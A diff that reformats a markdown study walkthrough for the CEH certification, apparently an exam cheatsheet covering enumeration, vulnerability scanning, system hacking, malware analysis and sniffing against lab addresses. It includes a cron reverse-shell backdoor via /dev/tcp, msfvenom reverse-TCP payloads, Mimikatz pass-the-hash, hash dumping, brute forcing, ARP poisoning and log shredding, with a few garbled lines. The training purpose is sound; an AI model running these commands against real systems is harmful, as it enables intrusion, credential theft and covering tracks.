@@ -4,7 +4,7 @@
 
 ^top
 
-- [Module 03: Scanning Networks](/CEH%20Walkthrough.md#module-03-scanning-networks)  
+- [Module 03: Scanning Networks](/CEH%20Walkthrough.md#module-03-scanning-networks)
 - [Module 04 Enumeration](/CEH%20Walkthrough.md#module-04-enumeration)  
 - [Module 05 Vulnerability Analysis](/CEH%20Walkthrough.md#module-05-vulnerability-analysis)  
 - [Module 06 System Hacking](/CEH%20Walkthrough.md#module-06-system-hacking)  
@@ -24,7 +24,6 @@
 - [Appendix Tools Cheatsheet](/CEH%20Walkthrough.md#appendix-tools-cheatsheet)
 
 ---
-
 
 ## Module 03: Scanning Networks
 
@@ -174,903 +173,804 @@ nmap -sn -PR 192.168.1.0/24
 nmap -sS -T4 -p- -v 10.10.10.10
 nmap -A --script=http-enum 10.10.10.10
 
-[[CEH Walkthrough#^top|Back to top]]
+**[Back to top](#top)**
 
 ___
 ## Module 04: Enumeration
 
 ### NetBIOS/SMB Enumeration (Exam Weight: 30%)
 
+**Nmap SMB Scripts
+
+```
+nmap -p 445 --script=smb-enum-shares,smb-enum-users 10.10.10.10
 ```
 
-# Nmap SMB Scripts
 
-nmap -p 445 --script=smb-enum-shares,smb-enum-users 10.10.10.10
+**Enum4linux (All-in-One)
 
-  
+```
+enum4linux -a 10.10.10.10 | tee enum4linux.log  
+```
 
-# Enum4linux (All-in-One)
+**Manual SMBClient
 
-enum4linux -a 10.10.10.10 | tee enum4linux.log
-
-  
-
-# Manual SMBClient
-
+```
 smbclient -L //10.10.10.10 -N  # Null session
+```
 
+```
 smbclient //10.10.10.10/share -U 'username%password'
-
 ```
 
 ### SNMP Enumeration (Guaranteed Exam Task)
 
+**SNMP Walk (v1)
+
+```
+snmpwalk -c public -v1 10.10.10.10
 ```
 
-# SNMP Walk (v1)
+**Windows Specific
 
-snmpwalk -c public -v1 10.10.10.10
-
-  
-
-# Windows Specific
-
+```
 snmpwalk -c public -v1 10.10.10.10 1.3.6.1.4.1.77.1.2.25  # User accounts
+```
 
+```
 snmpwalk -c public -v1 10.10.10.10 1.3.6.1.2.1.25.4.2.1.2  # Running processes
+```
 
-  
+**Nmap SNMP Scripts
 
-# Nmap SNMP Scripts
-
+```
 nmap -sU -p 161 --script=snmp-sysdescr,snmp-interfaces 10.10.10.10
-
 ```
 
 ### LDAP Enumeration
 
+**Nmap LDAP Scripts
+
+```
+nmap -p 389 --script=ldap-rootdse,ldap-search 10.10.10.10
 ```
 
-# Nmap LDAP Scripts
+**Manual LDAP Search
 
-nmap -p 389 --script=ldap-rootdse,ldap-search 10.10.10.10
-
-  
-
-# Manual LDAP Search
-
+```
 ldapsearch -x -h 10.10.10.10 -b "dc=example,dc=com" "(objectClass=user)"
-
 ```
 
 ### DNS Enumeration
 
+**Zone Transfer Test
+
+```
+dig axfr @10.10.10.10 example.com
 ```
 
-# Zone Transfer Test
+**Nmap DNS Scripts
 
-dig axfr @10.10.10.10 example.com
-
-  
-
-# Nmap DNS Scripts
-
+```
 nmap -p 53 --script=dns-zone-transfer,dns-srv-enum 10.10.10.10
+```
 
-  
+**DNSRecon
 
-# DNSRecon
-
+```
 dnsrecon -d example.com -t axfr,std
-
 ```
 
 ###  Exam-Critical Reference Table
 
-  
-
-| Service | Tool       | Command Example          | Key Flags/Notes               |
-
-| ------- | ---------- | ------------------------ | ----------------------------- |
-
-| SMB     | enum4linux | `-a` for all checks      | Always try null session first |
-
-| SNMP    | snmpwalk   | `-c public -v1`          | Check MIB 1.3.6.1.2.1.25.*    |
-
-| LDAP    | ldapsearch | `-x` for simple auth     | Base DN required              |
-
-| DNS     | dig        | `axfr` for zone transfer | Test all NS servers           |
-
-  
+| Service | Tool       | Command Example           | Key Flags/Notes                |
+|---------|------------|---------------------------|---------------------------------|
+| SMB     | enum4linux | `enum4linux -a`           | Always try null session first  |
+| SNMP    | snmpwalk   | `snmpwalk -c public -v1`  | Check MIB `1.3.6.1.2.1.25.*`   |
+| LDAP    | ldapsearch | `ldapsearch -x`           | Base DN required               |
+| DNS     | dig        | `dig axfr`                | Test all NS servers            |
 
 ### Practical Exam Checklist
 
-  
-
 1. Perform SMB null session enumeration
-
 2. Enumerate SNMP public community string
-
 3. Test DNS zone transfers
-
 4. Extract LDAP directory information
-
 5. Document all findings with screenshots
-
-  
 
 ### Pro Tips:
 
-  
-
 - **Always check**: `rpcinfo -p 10.10.10.10` for RPC services
-
 - **Critical ports**: 139/445 (SMB), 161 (SNMP), 389 (LDAP), 53 (DNS)
-
 - **Exam trick**: Use `-Pn` with Nmap if host blocks ICMP
-
 - **Must-know MIBs**:
 
     - 1.3.6.1.2.1.25.1.6.0 (System processes)
-
     - 1.3.6.1.4.1.77.1.2.25 (User accounts)
-
-  
 
 ### Real-World Exam Lab
 
+**Task: Enumerate Windows Server
+
+```
+1. nmap -p 445 --script=smb-os-discovery 10.10.10.10
 ```
 
-# Task: Enumerate Windows Server
-
-1. nmap -p 445 --script=smb-os-discovery 10.10.10.10
-
+```
 2. enum4linux -a 10.10.10.10 | tee windows_enum.txt
+```
 
+```
 3. snmpwalk -c public -v1 10.10.10.10 1.3.6.1.4.1.77.1.2.25
+```
 
+```
 4. dig axfr @10.10.10.10 internal.domain
-
 ```
 
   
-
 # Run these until automatic:
 
+```
 enum4linux -a 10.10.10.10
+```
 
+```
 snmpwalk -c public -v1 10.10.10.10
+```
 
+```
 nmap -p 445 --script=smb-enum-shares 10.10.10.10
+```
 
+```
 dig axfr @10.10.10.10 example.com
+```
 
-  
-
-[[CEH Walkthrough#^top|Back to top]]
+**[Back to top](#top)**
 
 ___
-
 ## Module 05: Vulnerability Analysis
-
-## Module 05: Vulnerability Analysis
-
-  
 
 ### Vulnerability Scanning Tools (Exam Weight: 40%)
 
+**OpenVAS (Greenbone) Setup
+
+```
+gvm-setup  # Initial configuration
+````
+
+```
+gvm-start  # Launch services
 ```
 
-# OpenVAS (Greenbone) Setup
-
-gvm-setup  # Initial configuration
-
-gvm-start  # Launch services
-
+```
 gsad --http-only --listen=127.0.0.1 -p 9392  # Web interface
+```
 
-  
+**Nessus Essentials (Exam Alternative)
 
-# Nessus Essentials (Exam Alternative)
-
+```
 /etc/init.d/nessusd start  # Start service
+```
 
-# Access https://localhost:8834
-
+```
+https://localhost:8834 # Access 
 ```
 
 ###  Web Vulnerability Scanning (Guaranteed Exam Task)
 
+**Nikto Comprehensive Scan
+
+```
+nikto -h http://10.10.10.10 -Tuning x5678 -o nikto_scan.html -Format htm
 ```
 
-# Nikto Comprehensive Scan
+**Nmap Vuln Scripts
 
-nikto -h http://10.10.10.10 -Tuning x5678 -o nikto_scan.html -Format htm
-
-  
-
-# Nmap Vuln Scripts
-
+```
 nmap -p 80,443 --script=vuln 10.10.10.10 -oN web_vulns.txt
-
 ```
 
 ### Network Vulnerability Scanning
 
+**Nmap Vulnerability Scan
+
+```
+nmap -p 1-1000 --script=vuln 10.10.10.10 -oA full_vuln_scan
 ```
 
-# Nmap Vulnerability Scan
+**Cisco Specific Vulns
 
-nmap -p 1-1000 --script=vuln 10.10.10.10 -oA full_vuln_scan
-
-  
-
-# Cisco Specific Vulns
-
+```
 nmap -p 23 --script=cisco-* 10.10.10.10
-
 ```
 
 ### Credential Vulnerability Testing
 
+**Hydra SSH Brute Force
+
+```
+hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4 -vV -o ssh_creds.txt
 ```
 
-# Hydra SSH Brute Force
+**Default Credential Checks
 
-hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4 -vV -o ssh_creds.txt
-
-  
-
-# Default Credential Checks
-
+```
 nmap -p 80 --script=http-default-accounts 10.10.10.10
-
 ```
 
 ### Exam-Critical Reference Table
 
-  
-
-| Tool      | Command Example                                                      | Key Flags           | Output Analysis Tips    |
-
-| --------- | -------------------------------------------------------------------- | ------------------- | ----------------------- |
-
-| Nikto     | `-Tuning x5678`                                                      | x=File, 5=Injection | Check for "OSVDB" IDs   |
-
-| OpenVAS   | `omp -u admin -w pass -X '<create_target><name>...</create_target>'` | XML formatted       | Look for CVSS >7.0      |
-
-| Nmap Vuln | `--script=vuln`                                                      | Combine with `-p-`  | "VULNERABLE" tags       |
-
-| Hydra     | `-vV` for verbose                                                    | `-t 4` for threads  | "login:password" format |
-
-  
+| Tool      | Command Example                                                                 | Key Flags             | Output Analysis Tips     |
+|-----------|---------------------------------------------------------------------------------|-----------------------|--------------------------|
+| Nikto     | `nikto -Tuning x5678`                                                           | x=File, 5=Injection   | Check for "OSVDB" IDs    |
+| OpenVAS   | `omp -u admin -w pass -X '<create_target><name>...</create_target>'`             | XML formatted         | Look for CVSS > 7.0      |
+| Nmap Vuln | `nmap --script=vuln`                                                            | Combine with `-p-`    | Look for "VULNERABLE" tags |
+| Hydra     | `hydra -vV`                                                                     | `-t 4` for threads    | Check for `login:password` format |
 
 ### Practical Exam Checklist
 
-  
-
 1. Perform full OpenVAS/Nessus scan
-
 2. Run Nikto against web servers
-
 3. Test default credentials on services
-
 4. Verify vulnerability findings manually
-
 5. Generate professional report
-
   
-
 ### Pro Tips:
 
-  
-
 - **Always check**: `/server-status` on Apache servers
-
 - **Critical plugins**: Enable "Dangerous" plugins in OpenVAS
-
 - **Exam trick**: Use `-T4` with Nmap for faster scans
-
 - **Must-know CVEs**: Heartbleed, Shellshock, EternalBlue
-
-  
 
 ### Real-World Exam Lab
 
+**Task: Assess Windows/Web Server
+
+```
+1. gvm-cli socket --gmp-username admin --gmp-password pass --xml "<get_tasks/>"
 ```
 
-# Task: Assess Windows/Web Server
-
-1. gvm-cli socket --gmp-username admin --gmp-password pass --xml "<get_tasks/>"
-
+```
 2. nikto -h http://10.10.10.10 -Tuning 4 -o web_scan.txt
+```
 
+```
 3. nmap -p 445 --script=smb-vuln-* 10.10.10.10
+```
 
+```
 4. hydra -L users.txt -P passwords.txt http-form-post "/login.php:user=^USER^&pass=^PASS^:F=incorrect" -vV
-
 ```
 
   
 
 # Run these until automatic:
 
+```
 nikto -h http://10.10.10.10 -Tuning 4
+```
 
+```
 nmap -p 80,443 --script=vuln 10.10.10.10
+```
 
+```
 hydra -L users.txt -P passwords.txt ssh://10.10.10.10
+```
 
+```
 gvm-cli socket --xml "<get_version/>"
-
+```
   
-
-[[CEH Walkthrough#^top|Back to top]]
-
+**[Back to top](#top)**
 ___
 
 ## Module 06: System Hacking
 
-## Module 06: System Hacking
-
-  
-
 ### 1. Password Cracking (Exam Weight: 30%)
 
+**Windows Hash Extraction
+
+```
+meterpreter > hashdump
 ```
 
-# Windows Hash Extraction
-
-meterpreter > hashdump
-
+```
 meterpreter > run post/windows/gather/smart_hashdump
+```
 
-  
 
-# John the Ripper (NTLM)
+**John the Ripper (NTLM)
 
+```
 john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
 
-  
 
-# Hashcat (GPU Accelerated)
+**Hashcat (GPU Accelerated)
 
+```
 hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force
-
 ```
 
 ### Privilege Escalation (Guaranteed Exam Task)
 
+**Windows (Meterpreter)
+
+```
+meterpreter > getsystem
 ```
 
-# Windows (Meterpreter)
-
-meterpreter > getsystem
-
+```
 meterpreter > run post/multi/recon/local_exploit_suggester
+```
 
-  
+**Linux (Manual)
 
-# Linux (Manual)
-
+```
 find / -perm -4000 2>/dev/null  # SUID Binaries
+```
 
+```
 sudo -l  # Check sudo permissions
-
 ```
 
 ### Maintaining Access
 
+**Metasploit Persistence
+
+```
+meterpreter > run persistence -X -i 60 -p 4444 -r 10.10.10.10
 ```
 
-# Metasploit Persistence
+**Cron Job Backdoor
 
-meterpreter > run persistence -X -i 60 -p 4444 -r 10.10.10.10
-
-  
-
-# Cron Job Backdoor
-
+```
 echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'" > cronjob
-
 ```
 
 ### Post-Exploitation Framework
 
+**Windows (Mimikatz)
+
+```
+mimikatz # privilege::debug
 ```
 
-# Windows (Mimikatz)
-
-mimikatz # privilege::debug
-
+```
 mimikatz # sekurlsa::pth /user:Admin /domain:TEST /ntlm:NTLM_HASH
+```
 
+```
 ./LinEnum.sh -t -r report.html`
-
 ```
 
 ### Clearing Tracks
 
+**Windows Event Log Manipulation
+
 ```
-
-# Windows Event Log Manipulation
-
 meterpreter > clearev
-
-meterpreter > run event_manager -i
-
-  
-
-# Linux Log Cleaning
-
-shred -zu /var/log/auth.log
-
-  
-
-# Linux Log Cleaning
-
-shred -zu /var/log/auth.log
-
 ```
 
-  
+```
+meterpreter > run event_manager -i
+```
+
+**Linux Log Cleaning
+
+```
+shred -zu /var/log/auth.log
+```
+
+**Linux Log Cleaning
+
+```
+shred -zu /var/log/auth.log
+```
 
 ### Exam-Critical Reference Table
 
-  
 
-| Technique         | Tool       | Command Example            | Key Flags           |
-
+| Technique         | Tool       | Command Example            | Key Flags           |
 | ----------------- | ---------- | -------------------------- | ------------------- |
-
-| Hash Extraction   | mimikatz   | `sekurlsa::logonpasswords` | Requires admin      |
-
-| Password Cracking | hashcat    | `-m 1000` for NTLM         | `--force` for GPU   |
-
-| Privilege Escal   | linpeas.sh | `./linpeas.sh`             | Look for yellow/red |
-
-| Persistence       | metasploit | `run persistence -X`       | `-i` for interval   |
-
-  
+| Hash Extraction   | mimikatz   | `sekurlsa::logonpasswords` | Requires admin      |
+| Password Cracking | hashcat    | `hashcat -m 1000` for NTLM | `--force` for GPU   |
+| Privilege Escal.  | linpeas.sh | `./linpeas.sh`             | Look for yellow/red |
+| Persistence       | metasploit | `run persistence -X`       | `-i` for interval   |
 
 ### Practical Exam Checklist
 
-  
-
 1. Extract password hashes
-
 2. Crack at least one admin hash
-
 3. Escalate privileges
-
 4. Establish persistence
-
 5. Clear event logs
-
-  
 
 ### Pro Tips:
 
-  
-
 - **Always check**: `sudo -l` on Linux targets
-
 - **Critical files**: `/etc/passwd`, `/etc/shadow`, SAM database
-
 - **Exam trick**: Use `--show` in John to view cracked passwords
-
 - **Must-know exploits**: Dirty Cow, CVE-2021-4034 (PwnKit)
-
-  
 
 ### Real-World Exam Lab
 
+**Task: Compromise Windows Target
+
+```
+1. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > payload.exe
 ```
 
-# Task: Compromise Windows Target
-
-1. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > payload.exe
-
+```
 2. msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.10.10; run"
+```
 
+```
 3. meterpreter > hashdump
+```
 
+```
 4. john --format=NT hashes.txt --wordlist=rockyou.txt
+````
 
+```
 5. meterpreter > getsystem
-
 ```
 
 # Run these until automatic:
 
+```
 john --format=NT hashes.txt --wordlist=rockyou.txt
+```
 
+```
 hashcat -m 1000 ntlm_hashes.txt rockyou.txt --force
+```
 
+```
 meterpreter > getsystem
+```
 
+```
 ./linpeas.sh -t
-
+```
   
-
-[[CEH Walkthrough#^top|Back to top]]
-
+**[Back to top](#top)**
 ___
 
 ## Module 07: Malware Threats
 
-## Module 07: Malware Threats
-
-  
-
 ### 1. Trojan Analysis (Exam Weight: 25%)
 
+**Static Analysis
+
+```
+strings malware.exe | grep -i -E "password|http|key"  # Extract cleartext artifacts
 ```
 
-# Static Analysis
-
-strings malware.exe | grep -i -E "password|http|key"  # Extract cleartext artifacts
-
+```
 peframe malware.exe  # PE file analysis
+```
 
-  
+**Dynamic Analysis (Sandbox)
 
-# Dynamic Analysis (Sandbox)
-
+```
 cuckoo submit malware.exe  # Automated sandbox
+```
 
+```
 wireshark -k -i any  # Monitor network traffic
-
 ```
 
 ### RAT Detection (Guaranteed Exam Task)
 
+**Network Indicators
+
+```
+netstat -ano | findstr "ESTABLISHED"  # Windows
 ```
 
-# Network Indicators
-
-netstat -ano | findstr "ESTABLISHED"  # Windows
-
+```
 ss -tulnp | grep -v "127.0.0.1"       # Linux
+```
 
-  
+**Process Analysis
 
-# Process Analysis
-
+```
 tasklist /svc /fi "STATUS eq running"  # Windows
+```
 
+```
 ps aux | grep -i -E "njrat|darkcomet"  # Linux
-
 ```
 
 ###  Virus Detection Tools
 
+**YARA Rules
+
+```
+yara -r malware_rules.yar suspicious_file.exe
 ```
 
-# YARA Rules
+**PE Analysis
 
-yara -r malware_rules.yar suspicious_file.exe
-
-  
-
-# PE Analysis
-
+```
 diec malware.exe  # Detect It Easy
+```
 
+```
 pecheck -a malware.exe  # Full PE inspection
-
 ```
 
 ### Malware Persistence Mechanisms
 
+**Windows Autostart Locations
+
+```
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 ```
 
-# Windows Autostart Locations
-
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
-
+```
 dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+```
 
-  
+**Linux Cron Jobs
 
-# Linux Cron Jobs
-
+```
 crontab -l
+```
 
+```
 ls -la /etc/cron* /var/spool/cron/crontabs
-
 ```
 
 ### Malware Reverse Engineering
 
+**Basic Disassembly
+
 ```
-
-# Basic Disassembly
-
 objdump -d malware.exe -M intel > disassembly.asm
-
-  
-
-# Behavioral Analysis
-
-strace -f -o trace.log ./malware
-
 ```
 
-  
+**Behavioural Analysis
+
+```
+strace -f -o trace.log ./malware
+```
 
 ### Exam-Critical Reference Table
 
   
-
-| Technique        | Tool    | Command Example                      | Key Indicators              |
-
-| ---------------- | ------- | ------------------------------------ | --------------------------- |
-
-| Static Analysis  | strings | `strings -el malware.exe`            | URLs, IPs, passwords        |
-
+| Technique        | Tool    | Command Example                      | Key Indicators              |
+|------------------|---------|--------------------------------------|-----------------------------|
+| Static Analysis  | strings | `strings -el malware.exe`            | URLs, IPs, passwords        |
 | Dynamic Analysis | Procmon | Filter: "Process Name = malware.exe" | Registry writes, file drops |
-
-| RAT Detection    | Netstat | `netstat -ano`                       | Unusual ports (5555, 9876)  |
-
-| YARA Scanning    | yara    | `yara -s rules.yar file.exe`         | Rule matches                |
-
-  
+| RAT Detection    | netstat | `netstat -ano`                       | Unusual ports (5555, 9876)  |
+| YARA Scanning    | yara    | `yara -s rules.yar file.exe`          | Rule matches                |
 
 ### Practical Exam Checklist
 
-  
-
 1. Perform static analysis on provided malware
-
 2. Identify persistence mechanisms
-
 3. Detect network callbacks
-
 4. Analyze packed/obfuscated code
-
 5. Document findings with screenshots
-
-  
 
 ### Pro Tips:
 
-  
-
 - **Always check**: `%TEMP%` directory for dropped files
-
 - **Critical ports**: 5555 (njRAT), 5110 (ProRAT), 9876 (Theef)
-
 - **Exam trick**: Use `binwalk -e` for embedded malware components
-
 - **Must-know tools**: PEiD, Detect It Easy, Process Hacker
-
-  
 
 ### Real-World Exam Lab
 
+**Task: Analyze suspicious.exe
+
+```
+1. strings suspicious.exe > strings.txt
 ```
 
-# Task: Analyze suspicious.exe
-
-1. strings suspicious.exe > strings.txt
-
+```
 2. diec suspicious.exe
+```
 
+```
 3. pecheck -a suspicious.exe
+```
 
+```
 4. netstat -ano | findstr "ESTABLISHED"
+```
 
+```
 5. reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 
 ```
 
 # Run these until automatic:
 
+```
 strings malware.exe | grep -i "http"
+```
 
+```
 netstat -ano | findstr "5555"
+```
 
+```
 diec suspicious_file.exe
+```
 
+```
 yara -r rules.yar malware_sample
+```
 
-  
-
-[[CEH Walkthrough#^top|Back to top]]
-
+**[Back to top](#top)**
 ___
 
 ## Module 08: Sniffing
 
-## Module 08: Sniffing
-
-  
-
 ### Passive Sniffing Techniques (Exam Weight: 30%)
 
+
+**TCPDump Basics
+
+```
+tcpdump -i eth0 -nn -vv -c 100 'port 80' -w capture.pcap
 ```
 
-# TCPDump Basics
+**Monitor HTTP Traffic
 
-tcpdump -i eth0 -nn -vv -c 100 'port 80' -w capture.pcap
-
-  
-
-# Monitor HTTP Traffic
-
+```
 tcpdump -i eth0 -A -s0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0'
+```
 
-  
+**Capture FTP Credentials
 
-# Capture FTP Credentials
-
-tcpdump -i eth0 -nn -v port 21 | grep -i 'USER\|PASS'
-
+```
+  tcpdump -i eth0 -nn -v port 21 | grep -i 'USER\|PASS'
 ```
 
 ### Active Sniffing (MITM Attacks)
 
+**ARP Poisoning
+```
+arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
 ```
 
-# ARP Poisoning
-
-arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
-
+```
 ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//
+```
 
-  
+**SSLStrip Attack
 
-# SSLStrip Attack
-
+```
 sslstrip -a -f -k
+```
 
+```
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
-
 ```
 
 ### Wireshark Filters (Exam MUST KNOW)
 
+**Find Cleartext Passwords
+
+```
+http.request.method == "POST" && http.file_data contains "password"
 ```
 
-# Find Cleartext Passwords
+**Detect ARP Spoofing
 
-http.request.method == "POST" && http.file_data contains "password"
-
-  
-
-# Detect ARP Spoofing
-
+```
 arp.duplicate-address-frame
+```
 
-  
+**VoIP Calls
 
-# VoIP Calls
-
+```
 udp.port == 5060 || udp.port == 10000-20000
-
 ```
 
 ### Protocol Analysis
 
+**DNS Query Monitoring
+```
+tcpdump -i eth0 -nn 'udp port 53'
 ```
 
-# DNS Query Monitoring
+**SMTP Email Capture
 
-tcpdump -i eth0 -nn 'udp port 53'
-
-  
-
-# SMTP Email Capture
-
+```
 tcpdump -i eth0 -nn -X -s0 'tcp port 25' | grep -i 'AUTH PLAIN\|MAIL FROM\|RCPT TO'
-
 ```
 
 ### Advanced Sniffing
 
+**Decrypt SSL Traffic (When Private Key Available)
+
 ```
-
-# Decrypt SSL Traffic (When Private Key Available)
-
 wireshark -o "ssl.desegment_ssl_records: TRUE" -o "ssl.desegment_ssl_application_data: TRUE" -o "ssl.keys_list: 10.10.10.10,443,http,key.pem" capture.pcap
-
-  
-
-# Extract Files from PCAP
-
-tshark -r capture.pcap --export-objects "http,./exported_files"
-
 ```
 
-  
+**Extract Files from PCAP
+
+```
+tshark -r capture.pcap --export-objects "http,./exported_files"
+```
 
 ### Exam-Critical Reference Table
 
-  
-
-| Technique        | Tool      | Command Example    | Key Filters           |     |     |
-
-| ---------------- | --------- | ------------------ | --------------------- | --- | --- |
-
-| Passive Sniffing | tcpdump   | `-nn -vv -c 100`   | 'port 80'             |     |     |
-
-| ARP Spoofing     | ettercap  | `-T -q -M arp`     | arp.duplicate-address |     |     |
-
-| SSL Stripping    | sslstrip  | `-a -f -k`         | http contains "login" |     |     |
-
-| VoIP Capture     | wireshark | `udp.port == 5060` | sip                   |     | rtp |
-
-  
+| Technique        | Tool      | Command Example   | Key Filters            | Notes | Extra |
+|------------------|-----------|-------------------|------------------------|-------|-------|
+| Passive Sniffing | tcpdump   | `-nn -vv -c 100`  | `port 80`              |       |       |
+| ARP Spoofing     | ettercap  | `-T -q -M arp`    | `arp.duplicate-address`|       |       |
+| SSL Stripping    | sslstrip  | `-a -f -k`        | `http` contains "login"|       |       |
+| VoIP Capture     | wireshark | `udp.port == 5060`| `sip`                   |       | rtp   |
 
 ### Practical Exam Checklist
 
-  
-
 1. Capture FTP/HTTP credentials
-
 2. Perform ARP poisoning attack
-
 3. Decrypt SSL traffic (when possible)
-
 4. Analyze captured VoIP calls
-
 5. Document findings with screenshots
-
-  
 
 ### Pro Tips:
 
-  
-
 - **Always check**: `arp -a` for MAC address conflicts
-
 - **Critical ports**: 21 (FTP), 25 (SMTP), 80 (HTTP), 5060 (SIP)
-
 - **Exam trick**: Use `-s0` in tcpdump for full packet capture
-
 - **Must-know filters**: `tcp.analysis.flags`, `http.cookie`
-
-  
 
 ### Real-World Exam Lab
 
+**Task: Capture Web Login Credentials
+
+```
+1. arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
 ```
 
-# Task: Capture Web Login Credentials
-
-1. arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
-
+```
 2. tcpdump -i eth0 -w login.pcap 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'
+```
 
+```
 3. wireshark login.pcap
+```
 
+```
 4. Filter: http.request.method == "POST" && http contains "password"
-
 ```
 
 # Run these until automatic:
 
+```
 tcpdump -i eth0 -nn -vv 'port 80'
+```
 
+```
 arpspoof -i eth0 -t victim_ip gateway_ip
+```
 
+```
 wireshark -Y "http.request.method == POST"
+```
 
+```
 ettercap -T -q -i eth0 -M arp
+```
 
-  
-
-[[CEH Walkthrough#^top|Back to top]]
-
+**[Back to top](#top)**
 ___
 
 ## Module 09: Social Engineering
 
-## Module 09: Social Engineering
-
   
-
 ```
 
 # SET Toolkit
@@ -1250,9 +1150,8 @@ aireplay-ng --deauth 100 -a AP:MAC wlan0mon
 
 netstat -n -p tcp | grep SYN_RECV
 
-  
-
-[[CEH Walkthrough#^top|Back to top]]
+    
+**[Back to top](#top)**
 
 ___
 
@@ -1411,9 +1310,9 @@ ettercap -T -q -i eth0 -M arp /victim_ip// /router_ip//
 
 tcpdump -i eth0 'tcp[13] & 2 != 0' -vv
 
-  
+    
+**[Back to top](#top)**
 
-[[CEH Walkthrough#^top|Back to top]]
 
 ___
 
@@ -1578,8 +1477,8 @@ ptunnel -p 10.10.10.10 -lp 1080 -da 192.168.1.100 -dp 22
 - **Must-know encoders**: `shikata_ga_nai`, `call4_dword_xor`
 
   
-
-[[CEH Walkthrough#^top|Back to top]]
+  
+**[Back to top](#top)**
 
 ___
 
@@ -1759,8 +1658,8 @@ whatweb http://10.10.10.10
 nikto -h http://10.10.10.10 -Tuning xbhydra -L users.txt -P passwords.txt ftp://10.10.10.10
 
   
-
-[[CEH Walkthrough#^top|Back to top]]
+  
+**[Back to top](#top)**
 
 ___
 
@@ -1784,9 +1683,8 @@ sqlmap -u "http://test.com?id=1" --risk=3 --level=5 --dbs
 
 ```
 
-  
-
-[[CEH Walkthrough#^top|Back to top]]
+    
+**[Back to top](#top)**
 
 ___
 
@@ -1980,8 +1878,8 @@ hydra -l admin -P rockyou.txt http-post-form "/login.php..."
 sqlmap -u "http://10.10.10.10/products?id=1" --dbs
 
   
-
-[[CEH Walkthrough#^top|Back to top]]
+  
+**[Back to top](#top)**
 
 ___
 
@@ -2160,8 +2058,7 @@ aireplay-ng --deauth 10 -a AP:MAC wlan0mon
 aircrack-ng -a2 -w rockyou.txt capture-01.cap
 
   
-
-[[CEH Walkthrough#^top|Back to top]]
+**[Back to top](#top)**
 
 ___
 
@@ -2266,8 +2163,9 @@ bettercap -iface wlan0
 - **Burp Mobile Setup**: Configure proxy to intercept mobile app traffic (port 8080)
 
   
+  
+**[Back to top](#top)**
 
-[[CEH Walkthrough#^top|Back to top]]
 
 ___
 
@@ -2377,7 +2275,7 @@ shodan search port:1883 MQTT
 
   
 
-## 🛠️ Enhanced Tools Reference
+## Enhanced Tools Reference
 
   
 
@@ -2394,8 +2292,8 @@ shodan search port:1883 MQTT
 | **RouterSploit** | `rsf.py`                                | Embedded device exploitation     |
 
   
-
-[[CEH Walkthrough#^top|Back to top]]
+  
+**[Back to top](#top)**
 
 ___
 
@@ -2634,8 +2532,9 @@ steghide extract -sf image.jpg -p "password"
 ```
 
   
+  
+**[Back to top](#top)**
 
-[[CEH Walkthrough#^top|Back to top]]
 
 ___
 
@@ -2660,5 +2559,5 @@ ___
 | John       | `john --format=NT hash.txt`               | Password cracking      |
 
 | SQLmap     | sqlmap -u "http://test.com?id=1" --risk=3 | Automated SQLi         |
-
-[[CEH Walkthrough#^top|Back to top]]
+  
+**[Back to top](#top)**
